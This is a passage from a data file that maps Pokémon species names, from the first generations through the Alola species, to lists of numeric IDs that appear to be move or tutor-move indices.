83, 71], "squirtle": [100, 38, 25], "wartortle": [100, 38, 25], "blastoise": [41, 51, 49, 100, 38, 25, 37, 83], "butterfree": [96, 70, 17, 23, 43, 71], "beedrill": [61, 17, 71], "pidgey": [82], "pidgeotto": [82], "pidgeot": [82], "rattata": [38, 43, 72, 20], "raticate": [38, 43, 72, 20], "spearow": [82], "fearow": [82], "ekans": [51, 17, 25, 37, 83, 69], "arbok": [32, 51, 17, 25, 37, 83, 69], "pikachu": [98, 96, 97], "raichu": [98, 96, 97], "sandshrew": [61, 100, 48, 37, 83], "sandslash": [61, 100, 48, 37, 83], "nidoran♀": [38, 20], "nidorina": [38, 20], "nidoqueen": [7, 64, 38, 95, 37, 83, 43, 20, 68], "nidoran♂": [38, 20], "nidorino": [38, 20], "nidoking": [7, 64, 38, 95, 37, 83, 43, 20, 68], "clefairy": [7, 38, 52, 22, 23, 43, 71, 72, 20], "clefable": [7, 38, 52, 22, 23, 43, 71, 72, 20], "vulpix": [51, 70, 64], "ninetales": [51, 70, 64, 52, 43, 71], "jigglypuff": [51, 70, 7, 100, 38, 23, 43, 71, 72, 20], "wigglytuff": [51, 70, 7, 100, 38, 23, 43, 71, 72, 20], "zubat": [17, 9, 43, 82], "golbat": [17, 9, 43, 82], "vileplume": [47], "paras": [61], "parasect": [61], "venonat": [70, 17, 52, 22, 23, 71], "venomoth": [80, 70, 17, 52, 22, 23, 71], "diglett": [37, 83], "dugtrio": [37, 83], "meowth": [61, 51, 48, 97, 85, 69, 43, 72, 20, 82], "persian": [61, 51, 48, 97, 85, 69, 43, 72, 20, 82], "psyduck": [38, 25, 22, 23, 89], "golduck": [38, 25, 85, 22, 23, 89], "mankey": [32, 95, 37, 83, 69, 20, 82], "primeape": [32, 95, 37, 83, 69, 20, 82], "growlithe": [95, 97], "arcanine": [61, 32, 95, 97, 71], "poliwag": [32, 38, 25, 23], "poliwhirl": [32, 38, 25, 23], "poliwrath": [32, 38, 25, 23, 37, 83], "abra": [47, 70, 43, 72], "kadabra": [47, 70, 43, 72], "alakazam": [47, 70, 43, 72], "machop": [32, 7, 37, 83], "machoke": [32, 7, 37, 83], "machamp": [32, 7, 37, 83], "weepinbell": [33], "victreebel": [33], "tentacool": [47, 17, 64, 38, 25], "tentacruel": [47, 17, 64, 38, 25], "geodude": [7, 100], "graveler": [7, 100], "golem": [7, 100], "ponyta": [97, 71], "rapidash": [97, 71], "slowpoke": [32, 7, 38, 25, 43, 72], "slowbro": [32, 7, 38, 25, 43, 72], "farfetch’d": [9, 82], "seel": [38], "dewgong": [97], "grimer": [7, 17, 64, 25, 37, 83, 43, 20], "muk": [51, 7, 17, 64, 25, 37, 83, 43, 20], "shellder": [38, 25, 55, 56], "cloyster": [25, 55, 56], "gastly": [51, 47, 70, 17, 52, 23, 20, 59], "haunter": [51, 47, 70, 17, 52, 23, 20, 59], "gengar": [51, 47, 70, 17, 52, 23, 72, 20, 59], "onix": [45, 49, 100], "drowzee": [47, 96, 52, 43, 72, 31], "hypno": [47, 96, 64, 52, 43, 72, 31], "krabby": [57, 38, 25, 37, 83], "kingler": [57, 38, 25, 37, 83], "voltorb": [100], "electrode": [100], "exeggutor": [32], "cubone": [7, 38, 37, 83], "marowak": [7, 38, 95, 37, 83], "hitmonlee": [32, 37, 83], "hitmonchan": [32, 37, 83], "lickitung": [32, 7, 12, 38, 37, 83, 43, 71, 20, 68], "koffing": [51, 7, 100, 22, 43, 20, 59], "weezing": [51, 7, 100, 9, 22, 43, 20, 59], "rhyhorn": [7, 38, 20], "rhydon": [7, 12, 38, 95, 20], "chansey": [32, 47, 98, 7, 38, 23, 37, 83, 43, 71, 72, 20], "kangaskhan": [32, 7, 57, 12, 38, 95, 37, 83, 43, 71, 20, 68], "horsea": [45, 49, 38, 95], "seadra": [45, 49, 38, 95], "goldeen": [57, 38, 25], "seaking": [57, 38, 25], "staryu": [47, 49, 100, 57, 38, 85, 23, 72, 20], "starmie": [47, 49, 100, 57, 38, 85, 72, 20], "mr. mime": [70, 43, 71, 72, 20], "scyther": [89], "jynx": [96, 70, 43], "electabuzz": [23], "magmar": [76, 23], "pinsir": [32, 37, 83], "tauros": [32, 7, 38, 95, 37, 83, 43, 71, 20], "gyarados": [32, 51, 45, 7, 38, 95, 72, 20], "lapras": [32, 98, 45, 95, 23, 20], "eevee": [43], "vaporeon": [38, 43], "jolteon": [43], "flareon": [43], "porygon": [38, 22, 23, 43, 71, 72, 20], "omanyte": [100, 57, 38, 25, 55, 56], "omastar": [100, 57, 38, 25, 55, 56], "kabuto": [17, 57, 38, 25], "kabutops": [17, 57, 38, 25, 54], "aerodactyl": [32, 94, 45, 7, 9], "snorlax": [32, 7, 38, 95, 37, 83, 69, 43, 71, 20], "articuno": [82], "zapdos": [9, 82], "moltres": [71, 82], "dratini": [8, 7, 12, 38, 72, 20], "dragonair": [8, 7, 12, 38, 72, 20], "dragonite": [32, 8, 7, 9, 12, 38, 37, 83, 72, 20], "mewtwo": [41, 32, 51, 73, 70, 7, 64, 38, 52, 85, 37, 83, 43, 71, 72, 20, 59], "mew": [76, 61, 80, 41, 33, 35, 32, 51, 47, 98, 94, 45, 96, 73, 70, 8, 67, 7, 49, 17, 100, 9, 64, 12, 38, 16, 48, 25, 52, 95, 97, 85, 37, 83, 77, 69, 43, 71, 55, 72, 20, 31, 56, 82, 89, 68, 59], "meganium": [32, 95], "cyndaquil": [61, 97], "quilava": [61, 97], "typhlosion": [61, 32, 100, 64, 52, 97, 37, 83, 43, 71], "totodile": [61, 94, 45, 38, 48, 37, 83], "croconaw": [61, 94, 45, 38, 48, 37, 83], "feraligatr": [61, 32, 94, 45, 38, 48, 95, 37, 83], "sentret": [7, 38, 97, 69, 43, 71, 20, 82], "furret": [7, 38, 97, 69, 43, 71, 20, 82], "hoothoot": [9, 52, 22, 23, 43], "noctowl": [9, 52, 22, 23, 43], "ledyba": [17, 71], "ledian": [17, 71], "spinarak": [17, 64, 52, 23, 71], "ariados": [17, 64, 52, 23, 71], "crobat": [51, 17, 9, 64, 43, 82], "chinchou": [47, 38, 22], "lanturn": [47, 38, 22], "pichu": [98, 97], "cleffa": [7, 22, 23, 43, 71, 72], "igglybuff": [7, 23, 43, 71, 72], "togepi": [7, 23, 43, 71, 72], "togetic": [7, 9, 23, 43, 71, 72], "natu": [47, 17, 9, 43, 71, 72, 82], "xatu": [47, 17, 9, 43, 71, 72, 82], "mareep": [47, 85], "flaaffy": [47, 85], "ampharos": [32, 47, 95, 85], "bellossom": [76, 47, 97, 31], "marill": [32, 38, 25], "azumarill": [32, 38, 25], "sudowoodo": [32, 25, 77, 55], "politoed": [32, 38, 25, 23], "hoppip": [47, 82], "skiploom": [47, 82], "jumpluff": [47, 82], "aipom": [61, 25, 69, 43, 71, 72, 20, 82], "sunflora": [47], "yanma": [17, 23, 43, 71], "wooper": [76, 38, 37, 83, 31], "quagsire": [76, 38, 37, 83, 31, 56], "espeon": [47, 96, 85, 43, 72], "umbreon": [23, 43, 72, 31], "murkrow": [9, 64, 23, 43, 72, 82], "slowking": [32, 7, 38, 25, 85, 37, 83, 43, 72], "misdreavus": [51, 47, 96, 70, 52, 85, 22, 23, 72, 20, 59], "girafarig": [32, 47, 70, 43, 72, 20], "pineco": [32, 17, 100, 37, 83, 77, 69, 71, 55, 56], "forretress": [32, 17, 37, 83, 77, 69, 71, 55, 72, 56], "dunsparce": [80, 32, 7, 100, 64, 38, 25, 37, 83, 43, 71, 20, 31], "gligar": [51, 48, 37, 83, 31, 56, 82], "steelix": [51, 45, 37, 83], "snubbull": [32, 7, 43, 71, 72, 20], "granbull": [32, 7, 95, 37, 83, 43, 71, 72, 20], "qwilfish": [100, 64, 38, 25, 43, 55, 72], "scizor": [61, 80, 89], "shuckle": [32, 100, 25, 77], "heracross": [61, 32, 37, 83, 55], "sneasel": [61, 48, 43], "teddiursa": [61, 32, 48, 97, 37, 83, 69], "ursaring": [61, 32, 48, 97, 37, 83, 69], "slugma": [32, 25, 85, 37, 83], "magcargo": [32, 100, 25, 77, 71], "swinub": [37, 83], "piloswine": [37, 83], "corsola": [32, 57, 38, 23, 43], "remoraid": [7, 38, 25, 23, 69, 72], "octillery": [70, 7, 49, 38, 25, 23, 69, 72], "delibird": [69, 55], "mantine": [32, 57, 38, 37, 83, 69], "skarmory": [51, 37, 83, 77, 55], "houndour": [25, 43, 71, 31], "houndoom": [25, 43, 71, 31], "kingdra": [49, 38], "phanpy": [97, 37, 83, 69], "donphan": [100, 97, 37, 83, 69], "porygon2": [38, 22, 23, 43, 71, 72, 20], "stantler": [32, 70, 22, 23, 43, 71, 72, 20], "tyrogue": [32, 37], "hitmontop": [61, 32, 100, 37], "smoochum": [96, 43], "elekid": [23], "magby": [76, 23], "miltank": [32, 100, 38, 97, 37, 83, 43, 71, 72, 20, 68], "blissey": [32, 47, 98, 7, 38, 23, 37, 83, 43, 71, 72, 20], "raikou": [41, 43], "entei": [32, 43, 71], "suicune": [80, 38, 43], "larvitar": [51, 45, 95], "pupitar": [61, 51, 45, 95], "tyranitar": [61, 32, 94, 45, 7, 12, 38, 25, 95, 77, 72, 20], "lugia": [17, 12, 38, 43, 20, 68], "ho-oh": [17, 23, 43, 71, 20], "celebi": [41, 47, 43, 72, 82], "treecko": [61, 37, 83], "grovyle": [61, 37, 83, 89], "sceptile": [61, 32, 94, 45, 95, 37, 83, 89], "torchic": [61, 37, 83], "combusken": [61, 37, 83], "blaziken": [61, 32, 37, 83, 71, 82], "mudkip": [38, 25, 37, 83], "marshtomp": [38, 37, 83], "swampert": [38, 95, 37, 83], "poochyena": [97, 43], "mightyena": [97, 43], "zigzagoon": [38, 25, 69, 43, 72, 20, 68], "linoone": [38, 25, 97, 69, 43, 72, 20, 68], "beautifly": [70, 17, 23, 43, 71], "dustox": [61, 70, 17, 23, 43, 71], "lotad": [98, 38], "lombre": [98, 38, 25], "ludicolo": [98, 38, 25], "seedot": [43], "nuzleaf": [37, 83, 43], "shiftry": [61, 80, 9, 64, 37, 83, 43, 56, 89, 59], "taillow": [82], "swellow": [82], "wingull": [38, 82], "pelipper": [38, 69, 82], "ralts": [43, 72, 20, 59], "kirlia": [43, 72, 20, 59], "gardevoir": [41, 70, 52, 43, 72, 20, 89, 59], "surskit": [17, 38, 25, 22, 43, 71], "masquerain": [70, 17, 12, 38, 25, 22, 43, 71], "shroomish": [31], "breloom": [61, 32, 25, 37, 83, 31], "slakoth": [61, 7, 38, 48, 25, 97, 37, 83, 69, 43, 71, 20], "vigoroth": [61, 32, 7, 38, 48, 25, 95, 97, 37, 83, 69, 43, 71, 72, 20], "slaking": [61, 32, 7, 38, 48, 25, 95, 97, 37, 83, 69, 43, 71, 72, 20], "nincada": [17, 43, 71], "ninjask": [17, 43, 71], "shedinja": [17, 71, 59], "whismur": [7, 38, 43, 71], "loudred": [32, 7, 38, 37, 83, 43, 71], "exploud": [32, 7, 12, 38, 95, 37, 83, 43, 71, 68], "makuhita": [32, 25, 37, 83], "hariyama": [32, 25, 37, 83], "azurill": [38, 25], "nosepass": [32, 47, 49, 77, 72, 20], "skitty": [38, 43, 71, 72, 20], "delcatty": [38, 43, 71, 72, 20], "sableye": [61, 47, 70, 17, 100, 48, 25, 85, 22, 23, 83, 72, 59], "mawile": [51, 7, 38, 37, 83, 43, 71], "aron": [32], "lairon": [32, 77], "aggron": [32, 51, 94, 7, 12, 38, 95, 77, 71, 72, 20, 68], "meditite": [61, 52, 37, 83, 43], "medicham": [61, 70, 52, 37, 83, 43], "electrike": [7], "manectric": [7], "plusle": [97], "minun": [97], "volbeat": [61, 80, 47, 17, 97, 43, 71, 72], "illumise": [61, 80, 47, 98, 96, 17, 97, 43, 71, 72, 20], "roselia": [47, 43, 55], "gulpin": [17, 38, 25, 69, 43, 71, 72], "swalot": [32, 17, 38, 25, 69, 43, 71, 72], "carvanha": [57, 38], "sharpedo": [32, 57, 38, 83], "wailmer": [32, 57, 38, 83], "wailord": [32, 57, 38, 83], "numel": [49, 37, 83], "camerupt": [49, 37, 83, 71], "torkoal": [32, 100, 37, 83, 71], "spoink": [47, 49, 52, 85, 43, 72], "grumpig": [32, 47, 70, 49, 25, 52, 85, 69, 43, 72], "spinda": [23, 37, 83, 43], "trapinch": [33, 17, 37, 83], "vibrava": [61, 80, 33, 35, 17, 9, 37, 83, 71, 82], "flygon": [61, 80, 33, 35, 8, 7, 17, 9, 37, 83, 71, 82, 89], "cacnea": [32, 51, 55, 56], "cacturne": [32, 43, 55, 56], "swablu": [47, 98, 9, 38, 97, 71], "altaria": [32, 47, 98, 8, 7, 9, 38, 97, 71, 59], "zangoose": [61, 41, 7, 38, 48, 37, 83, 69, 43, 71, 72, 20], "seviper": [32, 51, 7, 17, 69], "lunatone": [32, 100, 57, 38, 77, 43], "solrock": [32, 8, 7, 100, 9, 77, 43, 71, 59], "barboach": [45, 38, 95, 37, 83], "whiscash": [45, 38, 95, 37, 83], "corphish": [45, 38, 48, 25, 37, 83], "crawdaunt": [45, 38, 48, 25, 37, 83], "baltoy": [47, 100, 64, 38, 37, 83, 43, 71], "claydol": [47, 100, 64, 38, 37, 83, 43, 71], "lileep": [25], "cradily": [32, 25], "anorith": [25], "armaldo": [32, 49, 25], "feebas": [38, 25], "milotic": [32, 98, 45, 96, 38, 25], "castform": [70, 7, 57, 38, 43, 71, 72, 20], "kecleon": [61, 7, 38, 37, 83, 43, 71, 72, 20], "shuppet": [51, 47, 52, 22, 23, 72, 20, 59], "banette": [51, 47, 52, 22, 23, 72, 20, 59], "duskull": [51, 38, 52, 23, 59], "dusclops": [51, 38, 52, 23, 59], "tropius": [32, 45, 95, 82], "chimecho": [47, 98, 96, 70, 43, 72], "absol": [80, 7, 57, 64, 38, 97, 54, 37, 83, 43, 72, 20, 59], "snorunt": [64, 43, 55], "glalie": [32, 51, 100, 64, 43, 55], "spheal": [32, 37, 83], "sealeo": [32, 37, 83], "walrein": [32, 37, 83], "clamperl": [57, 38], "huntail": [57, 38, 83], "gorebyss": [57, 38, 23, 43], "relicanth": [32, 57, 38, 25], "luvdisc": [96, 38], "bagon": [8, 7, 12, 37, 83], "shelgon": [8, 7, 12, 37, 83], "salamence": [32, 8, 7, 9, 12, 37, 83], "metang": [61, 32, 37, 83, 43], "metagross": [61, 32, 37, 83, 43], "regirock": [32, 49, 77, 72, 20], "regice": [32, 49, 37, 83, 72, 20], "registeel": [32, 37, 83, 77, 72, 20], "latias": [61, 80, 41, 32, 98, 96, 70, 38, 43, 71, 72, 20, 68], "latios": [61, 80, 41, 32, 70, 38, 43, 71, 72, 20], "kyogre": [32, 38, 37, 83, 72, 20], "groudon": [61, 94, 7, 9, 48, 37, 83, 71, 72, 20, 59], "rayquaza": [32, 70, 7, 100, 12, 38, 37, 83, 71, 72, 20, 82, 68], "jirachi": [41, 47, 70, 97, 43, 72, 20, 82], "deoxys": [61, 51, 70, 49, 38, 52, 37, 83, 43, 71, 72, 20], "turtwig": [32, 25, 77], "grotle": [32, 25, 77], "torterra": [95, 37, 83], "chimchar": [37, 83, 82, 89], "monferno": [37, 83, 82], "infernape": [61, 32, 37, 83, 71, 82], "piplup": [61, 98, 38, 83], "prinplup": [61, 98, 38, 48, 83], "empoleon": [61, 80, 32, 98, 38, 37, 83, 89], "starly": [9, 82], "staravia": [9, 82], "staraptor": [9, 82], "bidoof": [38, 43, 72, 20], "bibarel": [32, 38, 43, 72, 20], "kricketune": [61, 17], "shinx": [97], "luxio": [97], "luxray": [97], "budew": [47, 43, 55], "roserade": [47, 43, 55], "cranidos": [32, 7, 38, 20], "rampardos": [32, 94, 7, 38, 95, 20], "shieldon": [32, 7, 38, 77, 20], "bastiodon": [32, 7, 38, 95, 77, 20], "wormadam": [23, 43], "mothim": [70, 17, 23, 43, 71], "vespiquen": [64, 85, 55, 31, 56], "pachirisu": [61, 25, 97, 69, 82], "buizel": [38, 83], "floatzel": [38, 83], "cherubi": [47, 96], "cherrim": [47, 96, 97], "shellos": [32, 38, 25, 37, 83], "gastrodon": [38, 37, 83], "ambipom": [61, 25, 69, 43, 71, 72, 20, 82], "drifloon": [100, 52, 22, 23, 72, 20, 59], "drifblim": [100, 52, 22, 23, 72, 20, 59], "buneary": [38, 97, 43, 71, 72, 20], "lopunny": [41, 38, 97, 43, 71, 72, 20, 82], "mismagius": [51, 47, 96, 70, 52, 85, 22, 23, 72, 20, 59], "honchkrow": [9, 64, 23, 43, 72, 82], "glameow": [61, 43, 20, 82], "purugly": [61, 32, 43, 20, 82], "chingling": [47, 70, 43, 72], "stunky": [7, 64, 97, 43], "skuntank": [8, 7, 64, 97, 43], "bronzor": [32, 64, 85, 37, 83, 43, 71], "bronzong": [32, 64, 52, 85, 37, 83, 43, 71], "bonsly": [32, 25, 77, 55], "mime jr.": [43, 71, 72, 20], "happiny": [98, 23, 43, 71, 72], "chatot": [82], "spiritomb": [22, 23, 83, 31, 59], "gible": [7, 48, 37, 83], "gabite": [61, 7, 48, 85, 37, 83], "garchomp": [61, 7, 48, 85, 37, 83], "munchlax": [32, 7, 38, 37, 83, 69, 43, 71, 20], "riolu": [61, 32, 48, 37, 83], "lucario": [61, 32, 51, 23, 37, 83, 43], "hippopotas": [37, 83], "hippowdon": [37, 83], "skorupi": [51, 83, 43], "drapion": [35, 32, 37, 83, 77, 43], "croagunk": [61, 32, 25, 37, 83, 43], "toxicroak": [61, 32, 51, 25, 37, 83, 43], "finneon": [47, 38, 22, 82], "lumineon": [80, 47, 38, 22, 82], "mantyke": [32, 57, 38, 37], "abomasnow": [32, 95, 37, 83], "weavile": [61, 48, 43], "lickilicky": [32, 7, 100, 12, 38, 37, 83, 43, 71, 20, 68], "rhyperior": [7, 49, 12, 38, 48, 95, 20], "tangrowth": [32, 37, 83], "electivire": [32, 7, 23, 37, 83], "magmortar": [76, 32, 23, 37, 83, 71, 20], "togekiss": [41, 7, 9, 23, 43, 71, 72], "yanmega": [17, 23, 43, 71], "leafeon": [61, 25, 43], "glaceon": [25, 43], "gliscor": [51, 48, 37, 83, 31, 56, 82], "mamoswine": [37, 83], "porygon-z": [51, 38, 22, 23, 43, 71, 72, 20], "gallade": [61, 80, 32, 47, 98, 96, 70, 64, 52, 37, 83, 43, 72, 20, 59], "probopass": [32, 47, 77, 72, 20], "dusknoir": [51, 38, 52, 23, 37, 83, 59], "froslass": [96, 52, 23, 55, 72, 20, 59], "rotom": [51, 52, 59], "uxie": [47, 96, 70, 17, 97, 43, 71, 72, 20, 82], "mesprit": [47, 96, 70, 38, 97, 43, 72, 20, 82], "azelf": [47, 96, 70, 7, 97, 43, 72, 20, 82], "dialga": [41, 32, 7, 38, 85, 37, 83, 72, 20], "palkia": [61, 41, 32, 7, 38, 85, 37, 83, 72, 20], "heatran": [32, 51, 85, 37, 83, 71], "regigigas": [32, 37, 83, 72, 20], "giratina": [41, 32, 51, 70, 23, 72, 20, 59], "cresselia": [47, 70, 38, 85, 43, 71, 72, 20], "phione": [47, 98, 38, 82], "manaphy": [47, 98, 70, 38, 22, 23, 43, 82], "darkrai": [64, 38, 23, 37, 83, 43, 72, 59], "shaymin": [80, 47, 98, 97, 23], "arceus": [76, 80, 41, 35, 32, 51, 47, 94, 45, 70, 7, 49, 17, 9, 64, 12, 38, 95, 85, 23, 37, 83, 43, 71, 72, 20, 59], "victini": [47, 70, 43, 71, 72, 20, 82], "snivy": [61], "servine": [61], "serperior": [61, 95], "tepig": [100, 83, 71], "pignite": [32, 100, 37, 83, 71], "emboar": [32, 100, 37, 83, 71], "oshawott": [61, 80, 38], "dewott": [61, 80, 38, 89], "samurott": [61, 80, 32, 51, 38, 89], "patrat": [43, 20, 31], "watchog": [7, 43, 72, 20, 31], "lillipup": [97, 83, 43, 72, 20], "herdier": [97, 83, 43, 72, 20], "stoutland": [97, 83, 43, 72, 20], "purrloin": [97, 69, 43, 72, 82], "liepard": [97, 54, 69, 43, 72, 82], "pansage": [83, 31], "simisage": [37, 83, 31], "pansear": [83, 71, 31], "panpour": [57, 38, 83, 31], "munna": [47, 70, 100, 37, 83, 43, 72], "musharna": [47, 70, 100, 37, 83, 43, 72], "pidove": [9, 82], "unfezant": [9, 82], "roggenrola": [32, 49, 77], "boldore": [32, 49, 77], "gigalith": [32, 49, 77, 71], "woobat": [70, 17, 100, 9, 43, 72, 82], "swoobat": [70, 17, 100, 9, 43, 72, 82], "drilbur": [61, 48, 37, 83], "excadrill": [61, 37, 83], "audino": [47, 96, 7, 38, 23, 43, 71, 72, 20], "timburr": [37, 83], "gurdurr": [37, 83], "conkeldurr": [32, 37, 83], "tympole": [57, 25], "palpitoad": [57], "seismitoad": [57, 37, 83], "sawk": [32, 37, 83], "leavanny": [80], "venipede": [100, 64, 71, 55], "whirlipede": [100, 64, 71, 55], "scolipede": [32, 100, 64, 37, 83, 71, 55], "whimsicott": [23, 43, 82], "basculin": [38, 25], "sandile": [37, 83], "krokorok": [61, 94, 37, 83], "krookodile": [61, 94, 95, 37, 83], "darumaka": [100, 37, 83, 71, 82], "darmanitan": [32, 100, 23, 37, 83, 71, 82], "maractus": [55], "dwebble": [32, 77, 71, 55], "scraggy": [76, 94, 45, 37, 83], "scrafty": [76, 94, 45, 95, 37, 83], "sigilyph": [51, 47, 70, 49, 9, 38, 43, 71, 72], "yamask": [51, 70, 23, 56, 59], "cofagrigus": [51, 70, 23, 56, 59], "archen": [32, 94, 9, 82], "archeops": [32, 94, 9, 95, 82], "trubbish": [51, 17, 69, 55], "garbodor": [51, 17, 23, 69, 71, 55, 20], "zorua": [64, 43, 82], "zoroark": [61, 7, 64, 23, 43, 31, 82], "minccino": [47, 97, 69, 72, 20, 82], "cinccino": [47, 97, 69, 72, 20, 82], "gothita": [51, 70, 37, 83, 43, 72, 20], "gothorita": [51, 70, 37, 83, 43, 72, 20], "gothitelle": [51, 70, 37, 83, 43, 72, 20], "solosis": [70, 49, 100, 52, 37, 83, 43, 72], "duosion": [70, 49, 100, 52, 37, 83, 43, 72], "reuniclus": [70, 49, 100, 52, 37, 83, 43, 72], "ducklett": [98, 38], "swanna": [98, 38], "vanillite": [49], "vanillish": [49], "vanilluxe": [49], "deerling": [32, 97, 43, 72], "sawsbuck": [32, 97, 43, 72], "emolga": [70, 71, 82], "karrablast": [70, 17], "escavalier": [70, 17], "alomomola": [38, 97, 23, 43], "joltik": [70, 17], "galvantula": [70, 17], "ferroseed": [55, 72, 20], "ferrothorn": [32, 55, 72, 20], "klink": [85, 72, 20], "klang": [85, 72, 20], "klinklang": [85, 72, 20], "eelektrik": [76, 49, 17, 82], "eelektross": [76, 32, 94, 7, 49, 17, 64, 95, 37, 83, 82], "elgyem": [51, 70, 37, 83, 43, 72, 20], "beheeyem": [51, 70, 49, 37, 83, 43, 72, 20], "litwick": [51, 70, 52, 23, 71], "lampent": [51, 70, 52, 23, 71], "chandelure": [51, 70, 52, 23, 71], "axew": [61, 32, 83], "fraxure": [61, 32, 83], "haxorus": [61, 32, 37, 83], "cubchoo": [61, 32, 48, 25, 97, 37, 83], "beartic": [61, 32, 48, 25, 97, 37, 83], "cryogonal": [49, 71], "accelgor": [70, 17, 25, 55, 56], "mienfoo": [61, 83, 82], "mienshao": [61, 83, 82], "druddigon": [32, 51, 7, 49, 9, 37, 83], "golett": [100, 38, 52, 23, 37, 83], "golurk": [49, 100, 38, 52, 23, 37, 83, 71, 20], "pawniard": [61, 80, 83, 72], "bisharp": [61, 80, 83, 72], "rufflet": [9, 37, 83, 82], "braviary": [9, 48, 37, 83, 82], "vullaby": [9, 83, 43, 31, 82], "mandibuzz": [9, 83, 43, 31, 82], "heatmor": [17, 83, 71], "durant": [70, 37, 83, 72], "deino": [72], "zweilous": [72], "hydreigon": [32, 8, 7, 49, 9, 12, 37, 83, 72, 82], "larvesta": [17, 23, 71], "volcarona": [80, 17, 23, 71], "cobalion": [61, 80, 72], "terrakion": [61, 80, 32], "virizion": [61, 80], "tornadus": [51, 9, 23, 82], "thundurus": [51, 49, 23, 82], "reshiram": [23, 37, 83, 43, 71], "zekrom": [49, 23, 37, 83, 43], "landorus": [95, 23, 37, 83, 82], "kyurem": [61, 49, 23, 37, 83, 43], "keldeo": [61, 80], "meloetta": [47, 98, 70, 97, 43, 72, 20, 82], "genesect": [51, 70, 7, 17, 38, 23, 71, 72, 20], "chespin": [61, 32, 48, 25, 37, 83, 55], "quilladin": [61, 32, 100, 48, 25, 37, 83, 55], "chesnaught": [61, 32, 94, 100, 48, 25, 37, 83, 55], "fennekin": [25, 22, 23, 71], "braixen": [25, 22, 23, 71], "delphox": [47, 64, 25, 52, 43, 71], "froakie": [61, 38, 25, 37, 83, 55, 56, 82], "frogadier": [61, 38, 25, 37, 83, 55, 56, 82], "greninja": [61, 38, 25, 37, 83, 55, 56, 82], "bunnelby": [32, 25, 37, 83, 55, 82], "diggersby": [37, 83, 82], "fletchling": [67, 9, 82], "fletchinder": [82], "talonflame": [71, 82], "vivillon": [96, 70, 17, 22, 23, 71], "litleo": [32, 71], "flabébé": [70, 17, 23, 69, 71], "floette": [70, 17, 23, 69, 71], "florges": [70, 17, 23, 69, 71], "skiddo": [32, 25, 97, 37], "gogoat": [61, 32, 25, 97, 37], "pancham": [32, 51, 37, 83], "pangoro": [32, 94, 95, 37, 83], "furfrou": [51, 72, 31, 82], "espurr": [51, 98, 70, 97, 43, 72, 20], "meowstic": [51, 98, 70, 97, 43, 72, 20], "honedge": [54, 37], "doublade": [54, 37], "aegislash": [80, 54, 37], "spritzee": [70, 49, 100, 23, 20], "swirlix": [70, 7, 23, 20], "slurpuff": [70, 7, 23, 20], "inkay": [61, 7, 37, 20], "malamar": [61, 7, 37, 20], "binacle": [32, 38, 25], "barbaracle": [32, 94, 38, 25], "skrelp": [25, 95, 97, 43, 20], "dragalge": [12, 25, 97, 43, 20, 68], "clauncher": [41, 51, 49, 38, 25, 37, 82], "clawitzer": [41, 51, 49, 38, 25, 37, 43, 82], "helioptile": [32, 51, 37, 83, 82], "heliolisk": [32, 51, 37, 83, 71, 82], "tyrunt": [32, 51, 97], "tyrantrum": [32, 51, 97], "amaura": [32, 51, 49, 25, 95, 72, 20], "aurorus": [32, 51, 49, 25, 95, 23, 72, 20], "sylveon": [23, 43], "hawlucha": [37, 83, 82], "dedenne": [69, 82], "carbink": [49, 100, 23, 77, 55], "goomy": [25, 37, 20], "sliggoo": [76, 38, 25, 37, 20, 31], "goodra": [76, 32, 7, 12, 38, 25, 37, 20, 31], "klefki": [23, 55, 72], "phantump": [32, 51, 52, 23, 37, 59], "trevenant": [32, 51, 52, 23, 37, 31, 59], "pumpkaboo": [51, 7, 100, 23, 37, 59], "gourgeist": [51, 7, 100, 23, 37, 59], "bergmite": [32, 100, 37, 83], "avalugg": [32, 49, 100, 12, 37, 83], "noibat": [51, 9, 23, 43, 71, 82], "noivern": [51, 7, 9, 23, 43, 71, 82], "xerneas": [49, 57, 95, 23, 37, 72, 20], "yveltal": [94, 9, 23, 37, 43, 82], "zygarde": [37], "diancie": [32, 49, 100, 23, 77, 55], "hoopa": [51, 70, 83, 72, 20], "volcanion": [32, 49, 100, 25, 37, 83, 71], "rowlet": [52], "dartrix": [52], "decidueye": [61, 80, 41, 52, 83, 82], "litten": [95, 82], "torracat": [95, 82], "incineroar": [61, 32, 95, 82], "popplio": [98, 96, 38, 97], "brionne": [98, 96, 38, 97], "primarina": [70, 38, 23, 43], "pikipek": [67, 9, 82], "yungoos": [32, 25, 83, 69, 82], "grubbin": [25, 72, 20], "charjabug": [25], "vikavolt": [80, 32, 70, 49, 25, 71], "crabrawler": [32, 25, 37, 83], "crabominable": [32, 25, 37, 83], "oricorio": [82], "cutiefly": [70, 23], "ribombee": [70, 23, 71], "rockruff": [32, 97], "lycanroc": [32, 97], "wishiwashi": [32, 57, 38, 25, 82], "mareanie": [38, 25], "toxapex": [64, 38, 25], "mudbray": [37, 83], "mudsdale": [37, 83], "dewpider": [17, 38], "araquanid": [17, 38], "fomantis": [33], "lurantis": [33], "morelull": [72], "salandit": [94, 72], "salazzle": [94, 45, 72], "stufful": [32, 37, 83], "bewear": [32, 94, 37, 83], "bounsweet": [47, 96, 97], "steenee": [47, 96, 97], "tsareena": [47, 96, 97, 82], "comfey": [70, 17, 69, 71, 82], "passimian": [32, 70, 100, 37, 83, 69, 43, 82], "wimpod": [57, 25, 55], "golisopod": [51, 57, 38, 25, 37, 83, 55], "sandygast": [70, 49, 17, 52, 23, 37, 83], "palossand": [70, 49, 17, 52, 23, 37, 83], "pyukumuku": [57], "type: null": [80, 94, 57, 37, 72, 82], "silvally": [80, 94, 7, 49, 57, 9, 38, 95, 37, 43, 72, 20, 82], "minior": [32, 47, 100, 23, 71, 82], "komala": [32, 48, 97, 37, 83, 69, 82], "turtonator": [32, 49, 83, 71], "togedemaru": [82], "mimikyu": [51, 17, 52, 23, 72, 20, 59], "bruxish": [38], "drampa": [32, 70, 7, 9, 12, 38, 97, 37, 43, 71, 72, 20], "dhelmise": [32, 49, 100, 12, 37, 68], "jangmo-o": [32, 37, 83], "hakamo-o": [61, 32, 48, 37, 83], "kommo-o": [61, 32, 7, 49, 48, 37, 83], "tapu koko": [82], "tapu lele": [70, 43, 20], "tapu bulu": [37, 83], "tapu fini": [38, 43], "solgaleo": [32, 8, 67, 7, 95, 37, 83, 71, 20], "lunala": [61, 80, 47, 9, 38, 52, 71, 20, 59], "nihilego": [47, 64, 23, 72, 20], "buzzwole": [32, 100, 95, 37, 83], "pheromosa": [38, 95], "xurkitree": [47, 70, 71], "celesteela": [32, 70, 7, 17, 37, 69, 71], "kartana": [80, 54], "guzzlord": [32, 7, 100, 9, 37, 83], "necrozma": [61, 32, 51, 45, 49, 100, 9, 48, 95, 85, 37, 83, 71], "magearna": [41, 73, 